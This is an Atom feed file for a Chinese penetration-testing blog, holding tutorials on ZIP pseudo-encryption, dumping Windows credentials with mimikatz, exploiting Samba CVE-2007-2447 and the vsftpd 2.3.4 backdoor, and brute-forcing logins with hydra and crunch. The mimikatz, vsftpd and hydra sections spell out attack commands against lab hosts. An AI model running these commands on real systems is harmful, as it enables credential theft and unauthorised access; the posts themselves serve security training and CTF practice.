@@ -1,0 +1,367 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://liangsheng8708.github.io</id>
+    <title>凉生丶因源的blog</title>
+    <updated>2022-10-13T15:52:55.259Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://liangsheng8708.github.io"/>
+    <link rel="self" href="https://liangsheng8708.github.io/atom.xml"/>
+    <logo>https://liangsheng8708.github.io/images/avatar.png</logo>
+    <icon>https://liangsheng8708.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2022, 凉生丶因源的blog</rights>
+    <entry>
+        <title type="html"><![CDATA[zip伪加密]]></title>
+        <id>https://liangsheng8708.github.io/zipweijiami/</id>
+        <link href="https://liangsheng8708.github.io/zipweijiami/">
+        </link>
+        <updated>2022-10-13T15:24:02.000Z</updated>
+        <content type="html"><![CDATA[<h2>前言</h2>
+zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。
+<h2>原理</h2>
+<storge>压缩源文件数据区：</storge>
+<pre>
+50 4B 03 04：这是头文件标记（0x04034b50）<br>
+14 00：解压文件所需 pkware 版本<br>
+00 00：全局方式位标记（判断有无加密）<br>
+08 00：压缩方式<br>
+5A 7E：最后修改文件时间<br>
+F7 46：最后修改文件日期
+</pre>
+<storge>压缩源文件目录区：</storge>
+<pre>
+50 4B 01 02：目录中文件文件头标记（0x02014b50）<br>
+1F 00：压缩使用的 pkware 版本<br>
+14 00：解压文件所需 pkware 版本<br>
+00 00：全局方式位标记（判断是否为伪加密）<br>
+08 00：压缩方式<br>
+5A 7E：最后修改文件时间<br>
+F7 46：最后修改文件日期
+</pre>
+<storge>压缩源文件目录结束标志：</storge>
+<pre>
+50 4B 05 06：目录结束标记<br>
+00 00：当前磁盘编号<br>
+00 00：目录区开始磁盘编号<br>
+01 00：本磁盘上纪录总数<br>
+01 00：目录区中纪录总数<br>
+59 00 00 00：目录区尺寸大小<br>
+3E 00 00 00：目录区对第一张磁盘的偏移量<br>
+00 00：ZIP 文件注释长度
+</pre>
+<h2>辨别方法</h2>
+<pre>
+全局方式位标记的四个数字中只有<strong>第二个数字</strong>对其有影响，其它的不管为何值，都不影响它的加密属性<br>
+第二个数字为奇数时 –>加密<br>
+第二个数字为偶数时 –>未加密
+</pre>
+<strong>未加密：</strong>
+<pre>
+压缩源文件数据区的全局方式位标记应当为00 00（50 4B 03 04 14 00 后）<br>
+且压缩源文件目录区的全局方式位标记应当为00 00（50 4B 01 02 14 00 后）
+</pre>
+<!-- ![](https://liangsheng8708.github.io/post-images/1665675674174.png) -->
+<img src="https://blog.liangsheng8708.ltd/post-images/1665675674174.png"><br>
+<strong>真加密：</strong>
+<pre>
+压缩源文件数据区的全局方式位标记应当为09 00（50 4B 03 04 14 00 后） <br>
+且压缩源文件目录区的全局方式位标记应当为09 00（50 4B 01 02 14 00 后） 
+</pre>
+<!-- ![](https://liangsheng8708.github.io/post-images/1665675815385.png) -->
+<img src="https://blog.liangsheng8708.ltd/post-images/1665675815385.png"><br>
+<strong>伪加密：</strong>
+<pre>
+压缩源文件数据区的全局方式位标记应当为 00 00（50 4B 03 04 14 00 后）<br>
+且压缩源文件目录区的全局方式位标记应当为 09 00（50 4B 01 02 14 00 后）
+</pre>
+<!-- ![](https://liangsheng8708.github.io/post-images/1665675719381.png) -->
+<img src="https://blog.liangsheng8708.ltd/post-images/1665675719381.png"><br>
+<h2>修改方法</h2>
+确定是伪加密后就需要将其修改为无加密，方法很简单，就是将压缩源文件目录区的全局方式位标记从09 00改为00 00<br>
+<!-- ![](https://liangsheng8708.github.io/post-images/1665676010543.png) -->
+<img src="https://blog.liangsheng8708.ltd/post-images/1665676010543.png"><br>
+<h2>反例</h2>
+这里是本文的重点所在，用winhex判断zip文件是否为伪加密存在问题，如图所示：<br>
+<!-- ![](https://liangsheng8708.github.io/post-images/1665676116087.png) -->
+<img src="https://blog.liangsheng8708.ltd/post-images/1665676116087.png"><br>
+按照上述的判断方法可以得出这是一个加密的zip文件，但实际上这是一个伪加密的zip文件，所以仅靠这种方法不能100%准确判断。]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[使用mimikatz获取windows密码]]></title>
+        <id>https://liangsheng8708.github.io/mimikatz/</id>
+        <link href="https://liangsheng8708.github.io/mimikatz/">
+        </link>
+        <updated>2022-10-13T14:19:21.000Z</updated>
+        <content type="html"><![CDATA[<h2>工具简介</h2>
+<p><strong>Mimikatz</strong>是法国人<strong>benjamin</strong>开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具。</p>
+<h2>常用命令</h2>
+<pre>
+kerberos：kerberos相关的模块<br>
+livessp：尝试检索livessp凭据<br>
+mimikatz_command：运行一个定制的命令<br>
+msv：msv凭证相关的模块，列出目标主机的用户密码哈希<br>
+ssp：ssp凭证相关的模块<br>
+tspkg：tspkg凭证相关的模块<br>
+wdigest：wdigest凭证相关的模块
+</pre>
+<pre>
+<strong>注：</strong><br>
+使用 mimikatz 模块需要System权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。<br>
+提到system有两个方法，一是当前的权限是administrator用户，二是利用其它手段先提权到administrator用户。然后administrator用户可以直接getsystem到system权限。
+</pre>
+<h2>使用教程</h2><br>
+加载mimikatz模块<br>
+<pre>
+load mimikatz
+</pre>
+<!-- ![](https://liangsheng8708.github.io/post-images/1665671919129.png) -->
+<img src="https://blog.liangsheng8708.ltd/post-images/1665671919129.png"><br>
+<br>
+<strong>第一种方法：</strong><br>
+获取登录密码的hash值<br>
+<pre>
+msv
+</pre>
+<!-- ![](https://liangsheng8708.github.io/post-images/1665673231188.png) -->
+<img src="https://blog.liangsheng8708.ltd/post-images/1665673231188.png"><br>
+上面已经是得到hash值了. 下面算明文密码.<br>
+获取明文密码
+<pre>
+kerberos
+</pre>
+look...拿到登录的明文密码了.<br>
+<p><strong>第二种方法：</strong><br><br>
+使用另一种方式获取哈希值<br></p>
+<pre>
+mimikatz_command -f samdump::hashes
+</pre>
+<!-- ![](https://liangsheng8708.github.io/post-images/1665672054493.png) -->
+<p><img src="https://blog.liangsheng8708.ltd/post-images/1665672054493.png"><br><br>
+根据上面的方式获取明文密码</p>
+<pre>
+mimikatz_command -f sekurlsa::searchPasswords
+</pre>
+<!-- ![](https://liangsheng8708.github.io/post-images/1665672077026.png) -->
+<p><img src="https://blog.liangsheng8708.ltd/post-images/1665672077026.png"><br><br>
+<strong>第三种方法：</strong><br><br>
+使用Wdigest命令<br><br>
+这个命令呢, 没有上面的复杂,加载模块后直接调用这个wdigest.<br></p>
+<pre>
+wdigest
+</pre>
+<!-- ![](https://liangsheng8708.github.io/post-images/1665672246965.png) -->
+<p><img src="https://blog.liangsheng8708.ltd/post-images/1665672246965.png"><br><br>
+第四种方法：<br>
+使用tspkg命令</p>
+<pre>
+tspkg
+</pre>
+<!-- ![](https://liangsheng8708.github.io/post-images/1665672274762.png) -->
+<p><img src="https://blog.liangsheng8708.ltd/post-images/1665672274762.png"><br></p>
+ <pre>
+<strong>总结</strong><br>
+一、<br>
+load mimikatz #加载mimikatz<br>
+msv #获取hash值<br>
+kerberos #获取明文<br>
+二、<br>
+load mimikatz #加载mimikatz<br>
+mimikatz_command -f samdump::hashes<br>
+mimikatz_command -f sekurlsa::searchPasswords<br>
+三、<br>
+load mimikatz #加载mimikatz<br>
+wdigest #获取系统账户信息<br>
+四、<br>
+load mimikatz #加载mimikatz<br>
+tspkg #获取系统账户信息<br>
+</pre>]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2007-2447渗透教程]]></title>
+        <id>https://liangsheng8708.github.io/CVE-2007-2447/</id>
+        <link href="https://liangsheng8708.github.io/CVE-2007-2447/">
+        </link>
+        <updated>2022-10-09T11:10:01.000Z</updated>
+        <content type="html"><![CDATA[<h2><strong>漏洞简介</strong></h2>
+<strong>Username map script</strong>是<strong>Samba</strong>协议的一个漏洞，ID为<strong>CVE-2007-2447</strong>，属于远程命令注入漏洞，主要影响Samba的3.0.20到3.0.25rc3 版本。<br>
+这个bug最初是针对匿名电话进行报告的到SamrChangePassword（）MS-RPC功能组合中与“用户名映射脚本”smb.conf选项（不是默认启用）。经过Samba开发人员的进一步调查，结果如下确定问题更广泛和影响远程打印机和文件共享管理。根原因是传递通过MS-RPC提供的未经过滤的用户输入在调用定义的外部脚本时调用/ bin / sh<br>
+在smb.conf中。但是，与“用户名映射脚本”不同，漏洞，远程文件和打印机管理脚本需要经过认证的用户会话。
+<h2><strong>漏洞生命周期</strong></h2>
+<pre>
+2007年5月7日：漏洞匿名披露到security@samba.org电子邮件列表中。<br>
+2007年5月7日：Samba的开发人员Gerald Carter开始响应这个漏洞。<br>
+2007年5月9日：Samba的开发者Jeremy Allison发布了补丁，用于iDefense测试。<br>
+2007年5月10日：向vendor-sec邮件列表发布通知。<br>
+2007年5月14日：公开漏洞信息。
+</pre>
+<h2><strong>渗透教程</strong></h2>
+1、	使用nmap工具扫描，发现139端口开放，疑似含有CVE-2007-2447
+ <!-- ![](https://liangsheng8708.github.io/post-images/1665360986405.png) -->
+ <img src="https://blog.liangsheng8708.ltd/post-images/1665360986405.png">
+ <br>
+2、	使用smbclient连接发现它的版本号为3.0.20
+ <!-- ![](https://liangsheng8708.github.io/post-images/1665361004197.png) -->
+  <img src="https://blog.liangsheng8708.ltd/post-images/1665361004197.png"> 
+ <br>
+3、	启动msfconsole搜索usermap_script
+ <!-- ![](https://liangsheng8708.github.io/post-images/1665361010900.png) -->
+  <img src="https://blog.liangsheng8708.ltd/post-images/1665361010900.png">
+ <br>
+4、	导入模块并填入数据
+ <!-- ![](https://liangsheng8708.github.io/post-images/1665361016387.png) -->
+  <img src="https://blog.liangsheng8708.ltd/post-images/1665361016387.png">
+ <br>
+5、	发起攻击，出现Command shell session X opened (本机IP:4444 -> 靶机IP:48943)即为成功
+ <!-- ![](https://liangsheng8708.github.io/post-images/1665361022415.png) -->
+  <img src="https://blog.liangsheng8708.ltd/post-images/1665361022415.png"
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2011-2523渗透教程]]></title>
+        <id>https://liangsheng8708.github.io/CVE-2011-2523/</id>
+        <link href="https://liangsheng8708.github.io/CVE-2011-2523/">
+        </link>
+        <updated>2022-10-09T09:53:32.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>CVE-2011-2523</strong>，别名<strong>笑脸</strong>，起源于<strong>vsftpd2.3.4</strong>，也就是<strong>verysecureFTPdaemon</strong>的缩写，是一款FTP服务器，在代码中存在一个重大的问题，在文件<strong>srt.c</strong>中出现一段与程序无关的代码。</p>
+<pre>{
+return 1;
+}
+else if((p_str-&gt;p_buf[i]==0x3a)&amp;&amp;(p_str-&gt;p_buf[i+1]==0x29))
+{
+vsf_sysutil_extra();
+}
+return 0;
+}
+</pre>
+<p>这样一段代码是c语言实现的选择结构的代码，功能是如果数组p_buf第i个元素是0x3a,第i+1个元素的0x29，就会执行vsf_sysutil_extra()函数，而vsf_sysutil_extra其实功拿是一个建立socket连接的端口是6200。而我们如何去触发这个连接后门？在vsftpd-2.3.4的设计中服务端会接收客户端发过来的用户名和密码，而用户名就存放在p_buf的数组中，所以我们只要在登录的时候输入0x3a0x29就会去触发这个socket连接后门。<br>
+之所以说笑脸漏洞，是因为0x3a0x29的字符是<strong> ：） </strong></p>
+<hr>
+<h2>实战演练</h2>
+<pre>攻击机：kali（10.168.1.160）
+靶  机：msfadmin（10.168.1.177）
+</pre>
+先使用<strong>nmap</strong>扫描靶机信息
+<img src="https://blog.liangsheng8708.ltd/post-images/1637146265400.png">
+<br>
+确认<strong>vsftpd</strong>版本为<strong>2.3.4</strong>，则进入下一步操作
+<hr>
+<h5>一般笑脸漏洞有两种渗透方法</h5>
+<h4>方法一</h4>（推荐）
+使用<strong>telnet</strong>或<strong>ns</strong>连接靶机的ftp服务器，输入随意用户名后面加：），密码随意
+<pre>telnet 10.168.1.177 21
+USER user:)
+PASS pass
+</pre>
+<!-- ![](https://liangsheng8708.github.io/post-images/1637147440258.png) -->
+<img src="https://blog.liangsheng8708.ltd/post-images/1637147440258.png">
+<br>
+pass回车后不要动，此时靶机会开启<strong>6200</strong>端口，原本的命令行不要关，再开一个命令行，使用<strong>telnet</strong>或<strong>ns</strong>连接靶机的<strong>6200</strong>端口
+<pre>telnet 10.168.1.177 6200
+</pre>
+<!-- ![](https://liangsheng8708.github.io/post-images/1637148127234.png) -->
+<img src="https://blog.liangsheng8708.ltd/post-images/1637148127234.png">
+<br>
+ 出现这个界面表示已经进入靶机的6200端口了，可以<strong> ls -l; </strong>看看，注意进入后每条命令都要加<strong> ; </strong>。
+ <h4>方法二</h4>
+ 使用MSF模块进行渗透，但大多数比赛都不会存在这个模块，所以不推荐。
+ <!-- ![](https://liangsheng8708.github.io/post-images/1637149004916.png) -->
+ <img src="https://blog.liangsheng8708.ltd/post-images/1637149004916.png">]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[hydra的使用教程]]></title>
+        <id>https://liangsheng8708.github.io/hydra/</id>
+        <link href="https://liangsheng8708.github.io/hydra/">
+        </link>
+        <updated>2022-10-09T09:47:43.000Z</updated>
+        <content type="html"><![CDATA[<p>hydra是著名黑客组织thc的一款开源的暴力破解密码工具，功能非常强大，kali下是默认安装的，几乎支持所有协议的在线破解。密码能否破解，在于字典是否强大。本文仅从安全角度去讲解工具的使用，请勿用于非法用途。</p>
+<hr>
+<h3>hydra参数讲解</h3>
+使用方法：hydra &lt; 参数 &gt; &lt;  IP地址 &gt; &lt; 服务名 &gt;
+<br>
+hydra是区分大小写的
+<pre>-R  #继续从上一次进度接着破解。
+-S  #采用SSL链接。
+-s  #PORT 可通过这个参数指定非默认端口。
+-l  #LOGIN 指定破解的用户，对特定用户破解。
+-L  #FILE 指定用户名字典。
+-p  #PASS 小写，指定密码破解，少用，一般是采用密码字典。
+-P  #FILE 大写，指定密码字典。
+-e  #ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。
+-C  #FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。
+-M  #FILE 指定目标列表文件一行一条。
+-o  #FILE 指定结果输出文件。
+-f  #在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。
+-t  #TASKS 同时运行的线程数，默认为16。
+-w  #TIME 设置最大超时的时间，单位秒，默认是30s。
+-v/-V #显示详细过程。
+server #目标ip
+service #指定服务名
+OPT #可选项
+</pre>
+<h3>操作演示</h3>
+这里我为了演示写了两个弱口令文本，在真实环境中需要用到强大得字典。
+<br>
+<!-- ![](https://liangsheng8708.github.io/post-images/1637202776136.png) -->
+<img src="https://blog.liangsheng8708.ltd/post-images/1637202776136.png">
+<br>
+破解ssh
+<br>
+<pre>hydra -L user.txt -P pass.txt -t 2 -vV -e ns 192.168.124.10 ssh</pre>
+<br>
+<!-- ![](https://liangsheng8708.github.io/post-images/1637203037942.png) -->
+<img src="https://blog.liangsheng8708.ltd/post-images/1637203037942.png">
+<br>
+破解ftp
+<pre>hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
+</pre>
+破解teamspeak
+<pre>hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
+</pre>
+破解pop3
+<pre>hydra -l muts -P pass.txt my.pop3.mail pop3
+</pre>
+这里就不依次说明了。
+上文说到，破解的关键在于密码字典得强大与否。所以我们在破解过程中就需要思考，如何获取强大的字典呢。在Kali中内置了很多字典，路径如下：
+<pre>cd /usr/share/wordlists/
+</pre>
+输入<storage>ls</storage>查看所有字典，这里详细举例两个目录
+<br>
+<code>dirb</code>
+<pre>big.txt #大的字典
+small.txt #小的字典
+catala.txt #项目配置字典
+common.txt #公共字典
+euskera.txt #数据目录字典
+extensions_common.txt #常用文件扩展名字典
+indexes.txt #首页字典
+mutations_common.txt #备份扩展名
+spanish.txt #方法名或库目录
+others #扩展目录，默认用户名、默认密码等
+stress #压力测试
+vulns #漏洞测试
+</pre>
+<code>dirbuster</code>
+<pre>apache-user-enum-** #apache用户枚举
+directories.jbrofuzz #目录枚举
+directory-list-1.0.txt #目录列表
+</pre>
+<!-- ![](https://liangsheng8708.github.io/post-images/1637203307707.png) -->
+<img src="https://blog.liangsheng8708.ltd/post-images/1637203307707.png">
+<br>
+需要破解什么就使用什么字典。
+光有这些还不够，有时候我们需要特定的字典，比如发现可以暴力破解四位数验证码，这就需要我们生成特定的字典。这样我们就要需要kali下的另一款工具了。
+<h3>字典生成工具</h3>
+基本指令
+<pre>crunch 最小位数 最大位数 指定生成范围
+</pre>
+例如，我要生成由三位数和四位数生成的字典，且都有6789组成，如下图
+<br>
+<!-- ![](https://liangsheng8708.github.io/post-images/1637203778153.png) -->
+<img src="https://blog.liangsheng8708.ltd/post-images/1637203778153.png">
+<br>
+我们还可以将生成的字典输出到特定文件中，格式如下
+<pre>crunch 3 4 6789 &gt;&gt;/home/kali/Desktop/pass.txt
+</pre>
+<!-- ![](https://liangsheng8708.github.io/post-images/1637203645105.png) -->
+<img src="https://blog.liangsheng8708.ltd/post-images/1637203645105.png">]]></content>
+    </entry>
+</feed>
